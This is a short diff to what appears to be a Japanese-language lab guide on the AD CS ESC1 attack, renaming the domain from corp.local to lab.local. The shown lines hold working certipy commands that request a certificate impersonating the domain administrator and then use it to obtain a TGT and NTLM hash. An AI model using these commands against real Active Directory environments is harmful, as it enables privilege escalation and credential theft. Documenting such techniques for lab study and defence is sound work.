@@ -29,8 +29,8 @@ ESC1 は AD CS（Active Directory Certificate Services）の証明書テンプ�
 
 ```
 # 管理者の SAN を指定して証明書を要求
-certipy req -u user@corp.local -p 'Password123' -ca 'CORP-CA' \
-  -target <CA_HOST> -template 'VulnTemplate' -upn administrator@corp.local
+certipy req -u user@lab.local -p 'Password123' -ca 'LAB-CA' \
+  -target <CA_HOST> -template 'VulnTemplate' -upn administrator@lab.local
 
 # 得た証明書で認証し、TGT と NTLM ハッシュを取得
 certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
